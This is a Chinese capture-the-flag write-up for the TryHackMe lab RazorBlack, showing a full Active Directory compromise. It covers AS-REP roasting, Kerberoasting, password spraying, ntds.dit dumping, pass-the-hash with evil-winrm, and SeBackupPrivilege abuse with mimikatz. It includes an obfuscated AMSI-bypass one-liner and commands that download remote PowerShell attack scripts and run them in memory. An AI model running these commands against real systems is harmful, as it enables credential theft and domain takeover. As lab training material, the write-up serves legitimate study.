# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务探测
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# nmap -sV -Pn 10.10.246.107          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 01:48 EST
Nmap scan report for 10.10.246.107 
Host is up (0.23s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-02 06:49:52Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 252.05 seconds

```

# 枚举
enum4linux,域名应该是RAZ0RBLACK.thm
```
Domain Name: RAZ0RBLACK
Domain Sid: S-1-5-21-3403444377-2687699443-13012745
```

枚举分享目录
```
└─# showmount -e 10.10.246.107 
Export list for 10.10.246.107 :
/users (everyone)
```

把远程目录mount到本地
```
mount -t nfs  10.10.246.107 :/users /mnt/share -o nolock
```

有两个文件
```
┌──(root💀kali)-[/mnt/share]
└─# ls           
employee_status.xlsx  sbradley.txt

```

拷贝到本地以后查看文件内容

sbradley.txt内容，Steven's Flag
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# cat sbradley.txt       
��THM{ab53e05c9a98def00314a14ccbfa8104}

```


employee_status.xlsx内容，爆出了一堆用户名,ljudmila vetrova貌似是DA
```
HAVEN SECRET HACKER's CLUB											
											
											
											
Name's			Role								
daven port			CTF PLAYER								
imogen royce			CTF PLAYER								
tamara vidal			CTF PLAYER								
arthur edwards			CTF PLAYER								
carl ingram			CTF PLAYER (INACTIVE)								
nolan cassidy			CTF PLAYER								
reza zaydan			CTF PLAYER								
ljudmila vetrova			CTF PLAYER, DEVELOPER,ACTIVE DIRECTORY ADMIN								
rico delgado			WEB SPECIALIST								
tyson williams			REVERSE ENGINEERING								
steven bradley			STEGO SPECIALIST								
chamber lin			CTF PLAYER(INACTIVE)								
```

尝试制作一个用户字典user.txt
```
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```

枚举关闭了Kerberos预认证的用户
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py raz0rblack.thm/ -usersfile /root/tryhackme/RazorBlack/user.txt   -dc-ip 10.10.246.107 
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:6d5f254f2b01b68443e01ac503a2ed67$bd6fadd530655734b4c85557dea62332df6604adef3cc68742b422b989df3073a8590f6fdf9b1ff84a7f401560d303f3e9a43ebce53c9a5530a9a7180e48e2dcf094b6088013000db177e67cc41ccdf9f94d20480a860cbc943fe0d89e1bc7a237c9754d4987f643f923be5b29f2f2dd2b2f96ef916d2450d2b2a5232c60f693065e299cf93efb6a4d3c23e31d40392e8271289c1765beebebc777aa1befb1acf7fabe45a6d9ecd0b92720c84db10178ca0838414cbcb551cc45b5682732ffb1561d6fed3e3959167ff4793dac3bf9046abff4e0e65621398bdb5df010df1e7e62a282a79f753321983d4910d39537f1
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```

出来一个twilliams的tgt

用john破解

```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
roastpotatoes    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)     
1g 0:00:00:06 DONE (2022-03-02 03:49) 0.1623g/s 685381p/s 685381c/s 685381C/s rob3560..roastedfish
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

现在有了一个用户凭证：
```
twilliams ： roastpotatoes
```


枚举smb
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# smbmap -u "twilliams" -p "roastpotatoes" -H 10.10.246.107 
[+] IP: 10.10.246.107 :445        Name: raz0rblack.thm                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        trash                                                   NO ACCESS       Files Pending for deletion

```


## spray the hash

用同样的密码对上面收集到的用户名做哈希喷洒
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# crackmapexec smb 10.10.246.107 -u user.txt -p pass.txt      
SMB         10.10.246.107    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.246.107    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
```
看到下面这组用户凭据提示要修改密码
```
sbradley:roastpotatoes
```

用smbpasswd.py修改一个新密码
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# python3 /root/impacket/examples/smbpasswd.py  RAZ0RBLACK.THM/sbradley:roastpotatoes@10.10.246.107 -newpass 'newpassword123'                                                                                                   1 ⨯
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.

```

再次查看smb分享目录，已经对trash有可读权限

```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# smbmap -u "sbradley" -p "newpassword123" -H 10.10.246.107 
[+] IP: 10.10.246.107 :445        Name: 10.10.246.107                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        trash                                                   READ ONLY       Files Pending for deletion

```


查看分享文件
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# smbclient -U 'sbradley%newpassword123' \\\\10.10.246.107 \\trash
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 02:01:28 2021
  ..                                  D        0  Tue Mar 16 02:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 14:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 02:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 14:24:21 2021

```


chat_log_20210222143423.txt
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# cat chat_log_20210222143423.txt
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....

The administrator died after this incident.

Press F to pay respects

```

zip文件需要破解，用zip2john转成john可以读取的格式，然后再用john破解
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# /usr/sbin/zip2john experiment_gone_wrong.zip> zip.hash   
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 ts=591C cs=591c type=8
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 ts=5873 cs=5873 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
electromagnetismo (experiment_gone_wrong.zip)     
1g 0:00:00:01 DONE (2022-03-02 04:27) 0.5882g/s 4929Kp/s 4929Kc/s 4929KC/s elfo2009..elboty2009
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

破解zip文件的密码为：```electromagnetismo```

查看文件
```
┌──(root💀kali)-[~/tryhackme/RazorBlack/experiment_gone_wrong]  ls                                                                  
ntds.dit  system.hive

```

> Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的%SystemRoot%\ntds\ntds.dit，活动目录始终会访问这个文件，所以文件禁止被读取

说白了就算AD里的数据库

用secretsdump.py把Ntds.dit里的数据导出，注意这里的数据很多，需要重定向到一个新文件user.hash 
```
python /root/impacket-master/examples/secretsdump.py -ntds ./ntds.dit -system ./system.hive LOCAL > user.hash 
```

查看这个文件，出现用户的NTML哈希信息
```
──(root💀kali)-[~/tryhackme/RazorBlack/experiment_gone_wrong]
└─# head user.hash -n 20
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x17a0a12951d502bb3c14cf1d495a71ad
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 84bf0a79cd645db4f94b24c35cfdf7c7
[*] Reading and decrypting hashes from ./ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1afedc472d0fdfe07cd075d36804efd0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:4ea59b8f64c94ec66ddcfc4e6e5899f9:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:703a365974d7c3eeb80e11dd27fb0cb3:::
<skip>
```

虽然得到了Administrator的哈希，但是不能通过哈希传递登录
上面的文件需要格式化成一个纯NTML文件，如
```
1afedc472d0fdfe07cd075d36804efd0
31d6cfe0d16ae931b73c59d7e0c089c0
4ea59b8f64c94ec66ddcfc4e6e5899f9
...
<skip>
```

然后再通过下面命令进行哈希喷洒
```
crackmapexec smb 10.10.246.107  -u /root/tryhackme/RazorBlack/user.txt -H user.hash 
```

得到一组有效的哈希：
```
lvetrova:f220d3988deb3f516c73f40ee16c431d
```
## pass the hash
使用evil-winrm登录，拿到foodhold
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# evil-winrm -i 10.10.246.107  -u lvetrova -H f220d3988deb3f516c73f40ee16c431d                                                                                                                                                         1 ⨯

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lvetrova\Documents> whoami
raz0rblack\lvetrova

```


使用下面两行代码拿到第一个用户flag
```
*Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"
*Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
THM{694362e877adef0d85a92e6d17551fe4}
```

# 权限提升
绕过powershell执行策略
```
$env:PSExecutionPolicyPreference="bypass"
```

绕过 AMSI
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

把powerview和SharpHound从远程服务器加载到靶机的内存
```
iex (iwr http://10.11.63.196/PowerView.ps1 -UseBasicParsing)

iex (iwr http://10.11.63.196/SharpHound.ps1 -UseBasicParsing)

iex (iwr http://10.11.63.196/Invoke-Mimikatz.ps1  -UseBasicParsing)
```


从bloodhound可以看出xyan1d3可以远程登录到DC服务器，而且是一个kerberoastablle的用户,属于backup用户组，由此可见是一个有价值的用户


查看用户的SPN
```
Evil-WinRM* PS C:\Users\lvetrova\Documents> Get-NetUser -spn |select userprincipalname,serviceprincipalname

userprincipalname      serviceprincipalname
-----------------      --------------------
                       kadmin/changepw
xyan1d3@raz0rblack.thm HAVEN-DC/xyan1d3.raz0rblack.thm:60111

```

存在一个xyan1d3的SPN，用GetUserSPNs.py导出

```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# python3  /root/impacket/examples/GetUserSPNs.py raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hash.txt
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>  
```


使用john破解
```
┌──(root💀kali)-[~/tryhackme/RazorBlack]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cyanide9amine5628 (?)
1g 0:00:00:05 DONE (2022-03-02 09:41) 0.1748g/s 1550Kp/s 1550Kc/s 1550KC/s cybermilk0..cy2802341
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


得到xyan1d3的明文密码：```cyanide9amine5628```


登录：
```
evil-winrm -i 10.10.246.107  -u xyan1d3 -p cyanide9amine5628
```


使用下面两行代码拿到第二个用户flag
```
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
```


查看当前用户权限
```
*Evil-WinRM* PS C:\Users\xyan1d3> whoami /all

USER INFORMATION
----------------

User Name          SID
================== ============================================
raz0rblack\xyan1d3 S-1-5-21-3403444377-2687699443-13012745-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```


拥有```SeBackupPrivilege```和```SeRestorePrivilege```两种提权能力

在hacktricks里是这样描述这个```SeBackupPrivilege```能力的

> This privilege causes the system to grant all read access control to any file (only read).
> Use it to read the password hashes of local Administrator accounts from the registry and then use "psexec" or "wmicexec" with the hash (PTH).
> This attack won't work if the Local Administrator is disabled, or if it is configured that a Local Admin isn't admin if he is connected remotely.


可以利用这个能力读取任何文件包括哈希文件，我们可以用于读取Administrator的哈希


关于```SeRestorePrivilege```
> Write access control to any file on the system, regardless of the files ACL.
> You can modify services, DLL Hijacking, set debugger (Image File Execution Options)… A lot of options to escalate.

可以在任何路径写入dll文件进行dll劫持

因为dll劫持还需要有重启系统服务的能力，我们重点关注SeBackupPrivilege的利用

我搜索了一下利用方法，找到了[这篇文章](https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a)


导出sam和system文件到本地
```
reg save HKLM\SAM sambkup.hiv

reg save HKLM\SYSTEM systembkup.hiv
```

使用mimikatz导出NTML哈希（注意每次登陆都要bypass powershell policy 和AMSI）
```
Evil-WinRM* PS C:\Users\xyan1d3\Documents> Invoke-Mimikatz -Command '"lsadump::sam /sam:sambkup.hiv /system:systembkup.hiv"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # lsadump::sam /sam:sambkup.hiv /system:systembkup.hiv
Domain : HAVEN-DC
SysKey : f1582a79dd00631b701d3d15e75e59f6
Local SID : S-1-5-21-1320649623-3804182013-2902712059

SAMKey : eaa05099b2f12f633fca797270e3e4fa

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 9689931bed40ca5a2ce1218210177f0c

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

```

使用哈希传递登录administrator的账号
```
──(root💀kali)-[~/tryhackme/RazorBlack]
└─# evil-winrm -i 10.10.246.107  -u Administrator -H 9689931bed40ca5a2ce1218210177f0c

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
raz0rblack\administrator

```
已拿到系统管理员权限

读取root.xml
```
*Evil-WinRM* PS C:\Users\Administrator> cat root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>

```

在hackbar上用hexdecode为
```
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b4f46cc4fba46348273d18dc91da20d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.

```

另一个cookie.json的内容
```
*Evil-WinRM* PS C:\Users\Administrator> cat cookie.json
{
        auth : "TG9vayB0aGlzIGlzIHlvdXIgY29va2llLgpGdW5GYWN0IDogVGhpcyBjb29raWUgY2FuIGNoYW5nZSBpdHMgb3duIGZsYXZvdXIgYXV0b21hdGljYWxseS4gVG8gdGVzdCBpdCBqdXN0IHRoaW5rIG9mIHlvdXIgZmF2b3VyaXRlIGZsYXZvdXIuCgpBbmQgc3RvcCBwdXR0aW5nICdPUiAnMSc9JzEgaW5zaWRlIGxvZ2luLnBocAoKRW5qb3kgeW91ciBDb29raWU="
}
```

base64decode后：
```
Look this is your cookie.
FunFact : This cookie can change its own flavour automatically. To test it just think of your favourite flavour.

And stop putting 'OR '1'='1 inside login.php

Enjoy your Cookie
```

去到另一个用户文件夹
```
*Evil-WinRM* PS C:\Users\twilliams> ls


    Directory: C:\Users\twilliams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
                                                 finitely_definitely_not_a_flag.exe

```

有一个名字超长的exe文件，尝试执行，但是失败了

直接读取
```
*Evil-WinRM* PS C:\Users\twilliams> cat definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{5144f2c4107b7cab04916724e3749fb0}
```


> What is the complete top secret?

把这张图片下载到本地
```C:\Program Files\Top Secret\top_secret.png```

答案是：```:wq```


